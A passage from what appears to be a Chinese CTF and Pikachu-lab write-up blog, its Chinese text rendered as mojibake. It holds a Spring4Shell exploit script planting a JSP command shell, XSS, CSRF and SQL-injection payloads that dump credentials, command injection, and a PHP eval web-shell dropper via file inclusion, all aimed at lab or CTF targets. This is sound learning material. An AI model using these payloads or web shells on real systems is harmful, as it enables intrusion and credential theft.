class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;http://121.5.35.176:30004/&quot;</span></span><br><span class="line">payload2=<span class="string">&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    U1=requests.get(url=ip+payload1,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    U2=requests.get(url=ip+payload2,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> U2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;The VULN CVE-2022-22965 exists, payload</span></span><br></pre></td></tr></table></figure><p>é…åˆ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><h3 id="ç»å¯¹éŸ³æ„Ÿ"><a href="#ç»å¯¹éŸ³æ„Ÿ" class="headerlink" title="ç»å¯¹éŸ³æ„Ÿ"></a>ç»å¯¹éŸ³æ„Ÿ</h3><p>wavæ‹–åˆ°010editoré‡Œï¼Œæœ€åä¸€æ®µå‘ç°æç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The interval of each byte data is <span class="number">9</span> <span class="keyword">and</span> the first byte is at the beginning of the wav data</span><br></pre></td></tr></table></figure><p>cå†™äº†ä¸ªè„šæœ¬è·‘å‡ºæ¥é‚®ä»¶ï¼š</p><p>Dear Friend ; Especially for you - this red-hot announcement<br>! We will comply with all removal requests ! This mail<br>is being sent in compliance with Senate bill 2116 ;<br>Title 1 ; Section 303 ! This is NOT unsolicited bulk<br>mail ! Why work for somebody else when you can become<br>rich within 81 months . Have you ever noticed nearly<br>every commercial on television has a .com on in it<br>and nearly every commercial on television has a .com<br>on in it . Well, now is your chance to capitalize on<br>this ! We will help you deliver goods right to the<br>customerâ€™s doorstep and use credit cards on your website<br>! You can begin at absolutely no cost to you . But<br>donâ€™t believe us . Ms Ames who resides in New Jersey<br>tried us and says â€œNow Iâ€™m rich many more things are<br>possibleâ€ ! This offer is 100% legal . So make yourself<br>rich now by ordering immediately ! Sign up a friend<br>and you get half off . Thanks ! Dear Salaryman ; Especially<br>for you - this amazing intelligence ! If you are not<br>interested in our publications and wish to be removed<br>from our lists, simply do NOT respond and ignore this<br>mail . This mail is being sent in compliance with Senate<br>bill 2716 , Title 3 , Section 303 ! This is different<br>than anything else youâ€™ve seen . Why work for somebody<br>else when you can become rich within 87 days . Have<br>you ever noticed most everyone has a cellphone and<br>society seems to be moving faster and faster . Well,<br>now is your chance to capitalize on this ! WE will<br>help YOU use credit cards on your website &amp; turn your<br>business into an E-BUSINESS . You can begin at absolutely<br>no cost to you ! But donâ€™t believe us ! Mr Ames of<br>Colorado tried us and says â€œIâ€™ve been poor and Iâ€™ve<br>been rich - rich is betterâ€ ! We are licensed to operate<br>in all states . Do not delay - order today ! Sign up<br>a friend and youâ€™ll get a discount of 50% . Thank-you<br>for your serious consideration of our offer .</p><p>ç„¶åæ ¹æ®æç¤ºå¯ä»¥æŠŠåƒåœ¾é‚®ä»¶ç»™è§£å¯†</p><p>ç”¨è¿™ä¸ªç½‘ç«™</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.spammimic.com/decode.cgi</span><br></pre></td></tr></table></figure><h3 id="ã€Midã€‘MidBypass"><a href="#ã€Midã€‘MidBypass" class="headerlink" title="ã€Midã€‘MidBypass"></a>ã€Midã€‘MidBypass</h3><p>æç¤ºè¯´äº†æœ‰disable_function,ç»™äº†ä¸€ä¸ªåé—¨</p><p>èšå‰‘ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªflagç›´æ¥é€äº†ï¼Œå…¶ä»–è·¯å¾„çœ‹ä¸äº†</p><p>è¿˜æœ‰ä¸€ä¸ªopen basedir</p><p>phpinfoå…ˆçœ‹çœ‹</p><hr><p>æœäº†å¥½å¤šå…³äºimagematrickçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä½†æ˜¯ç°åœ¨è¿˜æ²¡ææ‡‚å†™å…¥çš„pngæ€ä¹ˆæ‰§è¡Œå‘½ä»¤ğŸ¥²</p><p>èšå‰‘æ’ä»¶ä½œå¼Šè¿‡äº†ï¼Œä»¥åæœ‰æœºä¼šè¦å¤ç°ä¸€ä¸‹</p><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>å…ˆéƒ¨ç½²é¶åœºï¼Œæˆ‘ç›´æ¥æ”¾åœ¨æœ¬åœ°127.0.0.1äº†</p><h3 id="è§£é”çš®å¡ä¸˜çš„å¯†ç "><a href="#è§£é”çš®å¡ä¸˜çš„å¯†ç " class="headerlink" title="è§£é”çš®å¡ä¸˜çš„å¯†ç "></a>è§£é”çš®å¡ä¸˜çš„å¯†ç </h3><h3 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h3><h4 id="1-åŸºäºè¡¨å•æš´åŠ›ç ´è§£"><a href="#1-åŸºäºè¡¨å•æš´åŠ›ç ´è§£" class="headerlink" title="1.åŸºäºè¡¨å•æš´åŠ›ç ´è§£"></a>1.åŸºäºè¡¨å•æš´åŠ›ç ´è§£</h4><p>ç«ç‹æ”¹ä¸‹è®¾ç½®æŠ“æœ¬åœ°åŒ…</p><p>burpæŠ“åŒ…çˆ†ç ´ï¼Œçˆ†å‡ºæ¥å¯†ç 123456</p><h4 id="2-åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#2-åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="2. åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>2. åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h4><p>éšä¾¿è¯•äº†ä¸‹å¯†ç æ€ä¹ˆè¿˜æ˜¯123456â€¦â€¦..</p><p>å…ˆburpæŠ“åŒ…ï¼Œç„¶åå‘ç°ä¸€æ¬¡æŠ“åŒ…ä¸­éªŒè¯ç ä¸ç”¨æ”¹</p><p>å°±å’Œ1ä¸€æ ·äº†</p><h4 id="3-åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰"><a href="#3-åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon-clientï¼‰" class="headerlink" title="3.åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰"></a>3.åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h4><p>è¯•äº†ä¸€ä¸‹éªŒè¯ç æ˜¯å‰ç«¯çš„ï¼Œé‚£ä¹ˆæŠ“åŒ…ç›´æ¥å»æ‰ï¼Œå’Œ1ä¸€æ ·</p><p>å¯†ç æµ‹å‡ºæ¥è¿˜æ˜¯123456</p><h4 id="4-tokené˜²æš´ç ´"><a href="#4-tokené˜²æš´ç ´" class="headerlink" title="4.tokené˜²æš´ç ´"></a>4.tokené˜²æš´ç ´</h4><p>åˆè§è¿˜çœŸæ²¡æ€è·¯ï¼Œæœç´¢äº†ä¸€ä¸‹</p><p>æŠ“åŒ…pitchforkçˆ†ç ´å¯†ç å’Œtoken</p><p>å¦‚å›¾åœ¨extracté€‰ä¸­token</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2ca0453.png"></p><p>å¦‚å›¾å¡«å…¥ç¬¬ä¸€ä¸ªtoken,å¹¶é€‰æ‹©é€’å½’æœç´¢</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2d84a29.png"></p><p>æˆåŠŸï¼Œå¯†ç å½“ç„¶è¿˜æ˜¯12345</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-åå°„å‹xss-get"><a href="#1-åå°„å‹xss-get" class="headerlink" title="1.åå°„å‹xss(get)"></a>1.åå°„å‹xss(get)</h4><p>è¯•äº†ä¸€å †çƒæ˜Ÿï¼Œåªè®¤è¯†ç§‘æ¯”ï¼Œæœ‰ç‚¹éš¾ç»·ã€‚</p><p>è¯•äº†ä¸‹é™åˆ¶é•¿åº¦ï¼Œf12æ”¹æ‰å°±è¡Œï¼Œå†è¾“å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><h4 id="2-åå°„æ€§xss-post"><a href="#2-åå°„æ€§xss-post" class="headerlink" title="2.åå°„æ€§xss(post)"></a>2.åå°„æ€§xss(post)</h4><p>å‡ºbugäº†ï¼Œæˆ‘è¿™é¢˜å‡ºç°äº†ç™»å½•æ¡†</p><p>æœç´¢è¿™é¢˜æœ¬æ¥çš„æ ·å­ï¼Œç„¶åè„‘è¿‡å§</p><p>æ”¹æˆpostå°±æ˜¯postä¼ å‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="3-å­˜å‚¨å‹xss"><a href="#3-å­˜å‚¨å‹xss" class="headerlink" title="3.å­˜å‚¨å‹xss"></a>3.å­˜å‚¨å‹xss</h4><p>ä¹Ÿæ˜¯è¾“å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="4-DOMå‹xss"><a href="#4-DOMå‹xss" class="headerlink" title="4.DOMå‹xss"></a>4.DOMå‹xss</h4><p>f12çœ‹åˆ°æç¤º</p><pre><code>                function domxss()&#123;                    var str = document.getElementById(&quot;text&quot;).value;                    document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;                &#125;                //è¯•è¯•ï¼š&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;                //è¯•è¯•ï¼š&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</code></pre><p>è¾“å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span>leon<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f2e4b09e.png"></p><p>åŸç†å°±æ˜¯æå‰é—­åˆï¼Œè®©hrefçš„å±æ€§ä¸ºonclick</p><h4 id="5-xssç›²æ‰“"><a href="#5-xssç›²æ‰“" class="headerlink" title="5.xssç›²æ‰“"></a>5.xssç›²æ‰“</h4><p>ä¸Šä¸‹ä¸¤ä¸ªæ¡†éƒ½å¡«ä¸Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æç¤ºç™»å½•ç•™è¨€æ¿åå°ï¼Œå°±å¼¹çª—äº†</p><h4 id="6-xssä¹‹è¿‡æ»¤"><a href="#6-xssä¹‹è¿‡æ»¤" class="headerlink" title="6.xssä¹‹è¿‡æ»¤"></a>6.xssä¹‹è¿‡æ»¤</h4><p>è¿‡æ»¤script,å¤§å°å†™ç»•è¿‡</p><h4 id="7-xssä¹‹htmlspecialchars"><a href="#7-xssä¹‹htmlspecialchars" class="headerlink" title="7.xssä¹‹htmlspecialchars"></a>7.xssä¹‹htmlspecialchars</h4><p>specialcharså‡½æ•°ä¼šæŠŠå•åŒå¼•å·å’Œå°–æ‹¬å·éƒ½è½¬ä¹‰äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹è¿™é‡Œæ²¡è¿‡æ»¤å•å¼•å·</p><p>playload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="8-xssä¹‹hrefè¾“å‡º"><a href="#8-xssä¹‹hrefè¾“å‡º" class="headerlink" title="8.xssä¹‹hrefè¾“å‡º"></a>8.xssä¹‹hrefè¾“å‡º</h4><p>è¿‡æ»¤å•åŒå¼•å·ï¼Œç”¨ä¼ªåè®®ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="9-xssä¹‹jsè¾“å‡º"><a href="#9-xssä¹‹jsè¾“å‡º" class="headerlink" title="9.xssä¹‹jsè¾“å‡º"></a>9.xssä¹‹jsè¾“å‡º</h4><p>æå‰é—­åˆç¬¬ä¸€ä¸ªscript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€™&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="1-CSRF-get-login"><a href="#1-CSRF-get-login" class="headerlink" title="1.CSRF(get) login"></a>1.CSRF(get) login</h4><p>æŠ“åŒ…ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œç”¨burpç”Ÿæˆcsrf poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æ‰“å¼€é“¾æ¥ï¼š<a href="http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb">http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb</a></p><p>å‘ç°æˆåŠŸä¿®æ”¹ï¼ˆkobeè´¦æˆ·éœ€å¤„äºç™»å½•çŠ¶æ€ï¼‰</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2f262ca.png"></p><h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2.CSRF(post)"></a>2.CSRF(post)</h4><p>æ”¹æˆpostä¼ å‚ï¼Œå…¶ä»–å’Œ1ç›¸åŒï¼Œä¸å¤šèµ˜è¿°</p><h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3.CSRF Token"></a>3.CSRF Token</h4><p>é‡åˆ°tokenè¿˜æ˜¯ä¸ä¼š</p><p>æœäº†ä¸€ä¸‹è¦ç”¨åˆ°burpçš„CSRF Token Trackeræ’ä»¶</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2fdde2f.png"></p><p>æ·»åŠ å¦‚å›¾çš„è§„åˆ™</p><p>ç„¶åç”Ÿæˆpoc</p><h3 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h3><h4 id="1-æ•°å­—å‹æ³¨å…¥"><a href="#1-æ•°å­—å‹æ³¨å…¥" class="headerlink" title="1.æ•°å­—å‹æ³¨å…¥"></a>1.æ•°å­—å‹æ³¨å…¥</h4><p>æŠ“åŒ…ï¼Œç›´æ¥æ”¾playloadå§</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span><span class="operator">/</span><span class="operator">/</span>çˆ†åº“å</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="operator">/</span><span class="operator">/</span>çˆ†è¡¨å</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="operator">/</span><span class="operator">/</span>çˆ†åˆ—å</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users<span class="operator">/</span><span class="operator">/</span>çˆ†è´¦å·å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f30df172.png"></p><p>çˆ†å‡ºæ¥äº†</p><h4 id="2-å­—ç¬¦å‹æ³¨å…¥"><a href="#2-å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="2.å­—ç¬¦å‹æ³¨å…¥"></a>2.å­—ç¬¦å‹æ³¨å…¥</h4><p>æ³¨æ„é—­åˆï¼Œå…¶ä»–å’Œ1ä¸€æ ·</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>â€™<span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users#</span><br></pre></td></tr></table></figure><h4 id="3-æœç´¢å‹æ³¨å…¥"><a href="#3-æœç´¢å‹æ³¨å…¥" class="headerlink" title="3.æœç´¢å‹æ³¨å…¥"></a>3.æœç´¢å‹æ³¨å…¥</h4><p>åªæ˜¯å¤šäº†ä¸€åˆ—</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select username,password,1 from pikachu.users#</span></span><br></pre></td></tr></table></figure><h4 id="4-XXå‹æ³¨å…¥"><a href="#4-XXå‹æ³¨å…¥" class="headerlink" title="4. XXå‹æ³¨å…¥"></a>4. XXå‹æ³¨å…¥</h4><p>ç”¨ â€˜) æ¥é—­åˆ</p><p>playlaod:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union selct username,password from users #</span></span><br></pre></td></tr></table></figure><h4 id="5-insert-updateæ³¨å…¥"><a href="#5-insert-updateæ³¨å…¥" class="headerlink" title="5. insert&#x2F;updateæ³¨å…¥"></a>5. insert&#x2F;updateæ³¨å…¥</h4><p>æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="6-Deleteæ³¨å…¥"><a href="#6-Deleteæ³¨å…¥" class="headerlink" title="6.Deleteæ³¨å…¥"></a>6.Deleteæ³¨å…¥</h4><p>è¿˜æŒºæ–°é¢–çš„ï¼Œç•™è¨€æ¿æ— æ³•æ³¨å…¥ï¼Œéšä¾¿è¾“å…¥ï¼Œç„¶ååˆ é™¤ï¼ŒæŠ“åŒ…</p><p>æŠ“åŒ…å‘ç°getä¼ äº†ä¸€ä¸ªidï¼Œé‚£ä¹ˆåˆ©ç”¨idæ³¨å…¥ï¼Œè¿˜æ˜¯ç”¨æŠ¥é”™æ³¨å…¥</p><p>æ³¨æ„ï¼š</p><p>ä¸€äº›å…³é”®å­—å¦‚#ï¼Œç©ºæ ¼éœ€è¦è¿›è¡ŒURLæ ¼å¼è½¬æ¢</p><h4 id="7-httpå¤´æ³¨å…¥"><a href="#7-httpå¤´æ³¨å…¥" class="headerlink" title="7.httpå¤´æ³¨å…¥"></a>7.httpå¤´æ³¨å…¥</h4><p>æ ¹æ®æç¤ºç™»å½•æŠ“åŒ…ï¼Œç”¨user-agentè¿›è¡Œæ³¨å…¥</p><p>playlaod:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span><span class="operator">^</span><span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f31e2046.png"></p><h4 id="8-å¸ƒå°”ç›²æ³¨"><a href="#8-å¸ƒå°”ç›²æ³¨" class="headerlink" title="8.å¸ƒå°”ç›²æ³¨"></a>8.å¸ƒå°”ç›²æ³¨</h4><p>ä¸Špythonè„šæœ¬å§ï¼ŒæŠŠåšsqlçš„é¢˜ç›®çš„è„šæœ¬æ¡èµ·æ¥æ”¹æ”¹</p><p><img src="https://bu.dusays.com/2023/11/03/65450f330b8d8.png"></p><p>è„šæœ¬å°±æ˜¯æ–¹ä¾¿å•Š</p><h4 id="9-å»¶æ—¶ç›²æ³¨"><a href="#9-å»¶æ—¶ç›²æ³¨" class="headerlink" title="9.å»¶æ—¶ç›²æ³¨"></a>9.å»¶æ—¶ç›²æ³¨</h4><p>æŠŠä¸Šé¢çš„è„šæœ¬æ”¹æ”¹ï¼Œå»¶æ—¶è€—æ—¶å¤ªé•¿äº†ï¼Œä¸èµ˜è¿°äº†</p><h4 id="10-å®½å­—èŠ‚æ³¨å…¥"><a href="#10-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="10. å®½å­—èŠ‚æ³¨å…¥"></a>10. å®½å­—èŠ‚æ³¨å…¥</h4><p>lili%dfâ€™ or 1&#x3D;2 </p><p>ç»§ç»­æ”¹å¸ƒå°”ç›²æ³¨çš„è„šæœ¬å§</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-exec-â€œpingâ€"><a href="#1-exec-â€œpingâ€" class="headerlink" title="1.exec â€œpingâ€"></a>1.exec â€œpingâ€</h4><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 |whoami</span><br></pre></td></tr></table></figure><h4 id="2-exec-â€œevalâ€"><a href="#2-exec-â€œevalâ€" class="headerlink" title="2.exec â€œevalâ€"></a>2.exec â€œevalâ€</h4><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><h4 id="1-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#1-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="1.æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>1.æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><p>å›¾ç‰‡è·¯å¾„å¯ä¿®æ”¹ï¼Œæ”¹ä¸º..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini</p><p>æˆåŠŸæŸ¥win.iniæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æœ¬åœ°å†™ä¸€ä¸ªæœ¨é©¬ï¼Œå°±èƒ½é€šè¿‡è¿™ç§æ–¹å¼ç”¨èšå‰‘è¿æ¥äº†</p><h4 id="2-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#2-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="2.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>2.è¿œç¨‹æ–‡ä»¶åŒ…å«</h4><p>åˆ›å»ºä¸€ä¸ªshell.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[leon])  ?&gt; &#x27;</span> ); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\phpstudy_pro\WWW\pikachu\vul\fileinclude\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f33cd1da.png"></p><p>æˆåŠŸç”Ÿæˆshell.phpï¼Œèšå‰‘è¿æ¥</p><h3 id="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" 